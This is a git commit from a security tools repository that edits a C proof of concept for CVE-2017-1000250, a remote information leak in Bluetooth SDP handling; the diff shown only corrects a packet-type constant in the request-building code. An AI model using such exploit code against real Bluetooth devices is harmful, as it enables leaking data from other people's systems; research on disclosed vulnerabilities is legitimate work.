marsyy__littl_tools
commit b7e87b2fe1a68ad358e2511f49049ece7a00f73b
Author:     daiyang <406555789@qq.com>
AuthorDate: Mon Sep 25 02:49:32 2017 -0400
Commit:     daiyang <406555789@qq.com>
CommitDate: Mon Sep 25 02:49:32 2017 -0400

    Develop | Add poc for CVE-2017-1000250
    
    Signed-off-by: daiyang <406555789@qq.com>

diff --git a/bluetooth/CVE-2017-1000250/poc_remote_info_leak.c b/bluetooth/CVE-2017-1000250/poc_remote_info_leak.c
index 540fd82..0ec56b8 100644
--- a/bluetooth/CVE-2017-1000250/poc_remote_info_leak.c
+++ b/bluetooth/CVE-2017-1000250/poc_remote_info_leak.c
@@ -92,14 +92,14 @@ static int parse_conn_req(void *buffer, __u8 ident, __le16 len, void *data) {
 }
 
 
-#define SDP_SVC_SEARCH_ATTR_RSP 0x6
+#define SDP_SVC_SEARCH_ATTR_REQ 0x6
 static int parse_sdp_search_attr_req(void *buffer, __le16 data_len, void *data){
 	sdp_pdu_hdr_t pdu_head;
 	int i;
 	__le16 tmp;
 	
 	memset(&pdu_head, 0, sizeof(pdu_head));
-	pdu_head.pdu_id = SDP_SVC_SEARCH_ATTR_RSP;
+	pdu_head.pdu_id = SDP_SVC_SEARCH_ATTR_REQ;
 	pdu_head.tid = 0;
 	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
 	pdu_head.plen = tmp;
